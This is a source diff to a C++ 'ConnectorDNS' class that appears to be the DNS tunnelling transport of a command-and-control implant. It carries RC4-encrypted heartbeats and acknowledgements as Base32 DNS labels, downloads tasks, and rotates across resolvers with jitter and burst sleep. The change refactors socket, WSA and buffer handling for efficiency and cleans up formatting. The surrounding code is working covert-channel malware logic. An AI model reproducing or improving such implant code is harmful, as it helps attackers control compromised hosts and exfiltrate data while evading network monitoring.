@@ -33,21 +33,21 @@ void ConnectorDNS::operator delete(void* p) noexcept
 ConnectorDNS::ConnectorDNS()
 {
     this->functions = (DNSFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DNSFUNC));
-    if (!this->functions) 
+    if (!this->functions)
         return;
 
-    this->functions->LocalAlloc   = ApiWin->LocalAlloc;
+    this->functions->LocalAlloc = ApiWin->LocalAlloc;
     this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
-    this->functions->LocalFree    = ApiWin->LocalFree;
-    this->functions->WSAStartup   = ApiWin->WSAStartup;
-    this->functions->WSACleanup   = ApiWin->WSACleanup;
-    this->functions->socket       = ApiWin->socket;
-    this->functions->closesocket  = ApiWin->closesocket;
-    this->functions->sendto       = ApiWin->sendto;
-    this->functions->recvfrom     = ApiWin->recvfrom;
-    this->functions->select       = ApiWin->select;
-    this->functions->gethostbyname= ApiWin->gethostbyname;
-    this->functions->Sleep        = ApiWin->Sleep;
+    this->functions->LocalFree = ApiWin->LocalFree;
+    this->functions->WSAStartup = ApiWin->WSAStartup;
+    this->functions->WSACleanup = ApiWin->WSACleanup;
+    this->functions->socket = ApiWin->socket;
+    this->functions->closesocket = ApiWin->closesocket;
+    this->functions->sendto = ApiWin->sendto;
+    this->functions->recvfrom = ApiWin->recvfrom;
+    this->functions->select = ApiWin->select;
+    this->functions->gethostbyname = ApiWin->gethostbyname;
+    this->functions->Sleep = ApiWin->Sleep;
     this->functions->GetTickCount = ApiWin->GetTickCount;
 }
 
@@ -60,10 +60,84 @@ ConnectorDNS::~ConnectorDNS()
     }
 }
 
+// WSA initialization (called once)
+BOOL ConnectorDNS::InitWSA()
+{
+    if (this->wsaInitialized)
+        return TRUE;
+
+    if (!this->functions || !this->functions->WSAStartup)
+        return FALSE;
+
+    WSADATA wsaData;
+    if (this->functions->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        return FALSE;
+
+    this->wsaInitialized = TRUE;
+
+    // Allocate reusable buffers
+    if (!this->queryBuffer)
+        this->queryBuffer = (BYTE*)MemAllocLocal(kQueryBufferSize);
+    if (!this->respBuffer)
+        this->respBuffer = (BYTE*)MemAllocLocal(kRespBufferSize);
+
+    return TRUE;
+}
+
+// WSA cleanup (called on close)
+void ConnectorDNS::CleanupWSA()
+{
+    if (this->cachedSocket != INVALID_SOCKET) {
+        this->functions->closesocket(this->cachedSocket);
+        this->cachedSocket = INVALID_SOCKET;
+    }
+
+    if (this->queryBuffer) {
+        MemFreeLocal((LPVOID*)&this->queryBuffer, kQueryBufferSize);
+        this->queryBuffer = NULL;
+    }
+    if (this->respBuffer) {
+        MemFreeLocal((LPVOID*)&this->respBuffer, kRespBufferSize);
+        this->respBuffer = NULL;
+    }
+
+    if (this->wsaInitialized && this->functions && this->functions->WSACleanup) {
+        this->functions->WSACleanup();
+        this->wsaInitialized = FALSE;
+    }
+}
+
+// Get socket (reuse cached or create new)
+SOCKET ConnectorDNS::GetSocket()
+{
+    if (this->cachedSocket != INVALID_SOCKET)
+        return this->cachedSocket;
+
+    if (!this->functions || !this->functions->socket)
+        return INVALID_SOCKET;
+
+    this->cachedSocket = this->functions->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    return this->cachedSocket;
+}
+
+// Release socket (keep cached unless forced close)
+void ConnectorDNS::ReleaseSocket(SOCKET s, BOOL forceClose)
+{
+    if (s == INVALID_SOCKET)
+        return;
+
+    if (forceClose) {
+        this->functions->closesocket(s);
+        if (s == this->cachedSocket)
+            this->cachedSocket = INVALID_SOCKET;
+    }
+    // If not forced, keep socket cached for reuse
+}
+
 // Private helper: Initialize DNS metadata header
 void ConnectorDNS::MetaV1Init(DNS_META_V1* h)
 {
-    if (!h) 
+    if (!h)
         return;
     h->version = 1;
     h->metaFlags = 0;
@@ -185,25 +259,23 @@ BOOL ConnectorDNS::ParsePutAckResponse(BYTE* response, ULONG respLen, ULONG* out
 BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
 {
     *outSize = 0;
-    if (!this->functions || !this->functions->WSAStartup || !this->functions->socket || !this->functions->sendto || !this->functions->recvfrom || !this->functions->closesocket)
+    if (!this->functions || !this->functions->sendto || !this->functions->recvfrom)
         return FALSE;
 
-    WSADATA wsaData;
-    if (this->functions->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    // Initialize WSA once (cached)
+    if (!InitWSA())
         return FALSE;
 
-    SOCKET s = this->functions->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (s == INVALID_SOCKET) {
-        this->functions->WSACleanup();
+    // Get cached or new socket
+    SOCKET s = GetSocket();
+    if (s == INVALID_SOCKET)
         return FALSE;
-    }
 
     const CHAR* resolver = (resolverIP && resolverIP[0]) ? resolverIP : "1.1.1.1";
 
     HOSTENT* he = this->functions->gethostbyname(resolver);
     if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
-        this->functions->closesocket(s);
-        this->functions->WSACleanup();
+        ReleaseSocket(s, TRUE);  // Force close on error
         return FALSE;
     }
 
@@ -213,9 +285,15 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
     addr.sin_port = _htons(53);
     memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
 
-    // Build DNS query
-    BYTE query[4096];
-    memset(query, 0, sizeof(query));
+    // Use pre-allocated buffer or stack fallback
+    BYTE* query = this->queryBuffer;
+    ULONG queryBufSize = kQueryBufferSize;
+    BYTE stackQuery[4096];
+    if (!query) {
+        query = stackQuery;
+        queryBufSize = sizeof(stackQuery);
+    }
+    memset(query, 0, queryBufSize);
     USHORT id = (USHORT)(this->functions->GetTickCount() & 0xFFFF);
     query[0] = (BYTE)(id >> 8);
     query[1] = (BYTE)(id & 0xFF);
@@ -225,10 +303,9 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
     query[5] = 0x01;
 
     int offset = 12;
-    int nameLen = DnsCodec::EncodeName(qname, query + offset, sizeof(query) - offset - 4);
+    int nameLen = DnsCodec::EncodeName(qname, query + offset, queryBufSize - offset - 4);
     if (nameLen < 0) {
-        this->functions->closesocket(s);
-        this->functions->WSACleanup();
+        ReleaseSocket(s, TRUE);
         return FALSE;
     }
     offset += nameLen;
@@ -259,8 +336,7 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
     // Send query
     int sent = this->functions->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
     if (sent != offset) {
-        this->functions->closesocket(s);
-        this->functions->WSACleanup();
+        ReleaseSocket(s, TRUE);
         return FALSE;
     }
 
@@ -274,19 +350,24 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
 
     int selResult = this->functions->select(0, &readfds, NULL, NULL, &timeout);
     if (selResult <= 0) {
-        this->functions->closesocket(s);
-        this->functions->WSACleanup();
+        ReleaseSocket(s, TRUE);  // Timeout - recreate socket next time
         return FALSE;
     }
 
-    // Receive response
-    BYTE resp[1024];
-    memset(resp, 0, sizeof(resp));
-    int addrLen = sizeof(addr);
-    int recvLen = this->functions->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
+    // Use pre-allocated buffer or stack fallback
+    BYTE* resp = this->respBuffer;
+    ULONG respBufSize = kRespBufferSize;
+    BYTE stackResp[4096];
+    if (!resp) {
+        resp = stackResp;
+        respBufSize = sizeof(stackResp);
+    }
 
-    this->functions->closesocket(s);
-    this->functions->WSACleanup();
+    int addrLen = sizeof(addr);
+    int recvLen = this->functions->recvfrom(s, (char*)resp, respBufSize, 0, (sockaddr*)&addr, &addrLen);
+
+    // Keep socket cached for reuse (don't close on success)
+    ReleaseSocket(s, FALSE);
 
     if (recvLen <= 12)
         return FALSE;
@@ -438,6 +519,9 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULO
 
 void ConnectorDNS::CloseConnector()
 {
+    // Cleanup WSA and cached resources
+    CleanupWSA();
+
     if (this->recvData) {
         MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
         this->recvData = NULL;
@@ -465,14 +549,14 @@ void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
 void ConnectorDNS::UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct)
 {
     this->profile.burst_enabled = enabled;
-    this->profile.burst_sleep   = sleepMs;
-    this->profile.burst_jitter  = jitterPct;
+    this->profile.burst_sleep = sleepMs;
+    this->profile.burst_jitter = jitterPct;
 }
 
 void ConnectorDNS::GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct)
 {
-    if (enabled)   *enabled   = this->profile.burst_enabled;
-    if (sleepMs)   *sleepMs   = this->profile.burst_sleep;
+    if (enabled)   *enabled = this->profile.burst_enabled;
+    if (sleepMs)   *sleepMs = this->profile.burst_sleep;
     if (jitterPct) *jitterPct = this->profile.burst_jitter;
 }
 
@@ -514,8 +598,9 @@ BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BY
                 if (b > 30000) b = 30000;
                 backoff = b;
             }
-            ULONG jitter = this->functions->GetTickCount() & 0x0FFF;
-            this->resolverDisabledUntil[idx] = this->functions->GetTickCount() + backoff + jitter;
+            ULONG currentTick = this->functions->GetTickCount();
+            ULONG jitter = currentTick & 0x0FFF;
+            this->resolverDisabledUntil[idx] = currentTick + backoff + jitter;
             this->resolverFailCount[idx] = 0;
         }
     }
@@ -531,8 +616,7 @@ void ConnectorDNS::SendHeartbeat()
     BuildAckData(hbData, this->downAckOffset, hbNonce, this->downTaskNonce);
     EncryptRC4(hbData, kAckDataSize, this->encryptKey, 16);
 
-    CHAR hbLabel[32];
-    memset(hbLabel, 0, sizeof(hbLabel));
+    CHAR hbLabel[32] = { 0 };
     DnsCodec::Base32Encode(hbData, kAckDataSize, hbLabel, sizeof(hbLabel));
 
     ULONG hbLogicalSeq = this->seq + 1;
@@ -578,8 +662,7 @@ void ConnectorDNS::SendAck()
     BuildAckData(ackData, this->downAckOffset, ackNonce, this->downTaskNonce);
     EncryptRC4(ackData, kAckDataSize, this->encryptKey, 16);
 
-    CHAR ackLabel[32];
-    memset(ackLabel, 0, sizeof(ackLabel));
+    CHAR ackLabel[32] = { 0 };
     DnsCodec::Base32Encode(ackData, kAckDataSize, ackLabel, sizeof(ackLabel));
 
     CHAR ackQname[256];
@@ -1000,7 +1083,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 if (isNewTask) {
                     if (this->downBuf && this->downTotal)
                         MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
-                    
+
                     this->downBuf = (BYTE*)MemAllocLocal(total);
                     if (!this->downBuf) {
                         this->downTotal = 0;
